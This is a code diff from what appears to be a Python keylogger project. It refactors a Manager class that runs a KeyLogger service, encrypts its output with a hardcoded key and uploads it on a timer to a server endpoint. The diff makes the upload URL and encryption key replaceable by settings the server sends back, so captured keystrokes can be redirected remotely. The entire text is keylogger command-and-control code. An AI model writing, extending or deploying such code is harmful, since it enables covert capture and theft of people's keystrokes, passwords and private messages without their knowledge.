@@ -9,8 +9,8 @@ from network_writer import NetworkWriter
 
 class Manager:
     def __init__(self):
-        self.time_network = 5
-        self.server_url = "http://127.0.0.1:5000/api/upload"
+        self.wait_time = 5
+        self.url = "http://127.0.0.1:5000/api/upload"
         self.status_listen = True
         self.key_encryptor = "nmrd"
 
@@ -18,10 +18,10 @@ class Manager:
         self.file_writer = FileWriter()
         self.service = KeyLogger(self.machine_name)
         self.encryptor = Encryptor(self.key_encryptor)
-        self.network_writer = NetworkWriter(self.server_url)
+        self.network_writer = NetworkWriter(self.url)
 
     def timer(self):
-        time.sleep(self.time_network)
+        time.sleep(self.wait_time)
 
     def stop_and_continue(self):
         self.service.stop_and_continue(self.status_listen)
@@ -32,14 +32,14 @@ class Manager:
         שדות שלא קיימים ב-response נשארים עם הערך הקודם שלהם.
         """
         settings = response_data.get("settings", {})
-        if "time_network" in settings:
-            self.time_network = settings["time_network"]
+        if "wait_time" in settings:
+            self.wait_time = settings["wait_time"]
 
         if "key_encryptor" in settings:
-            self.key_encryptor = settings["key_encryptor"]
+            self.encryptor.key = settings["key_encryptor"]
 
-        if "server_url" in settings:
-            self.server_url = settings["server_url"]
+        if "url" in settings:
+            self.network_writer.url = settings["url"]
 
         if "status_listen" in settings:
             self.status_listen = settings["status_listen"]
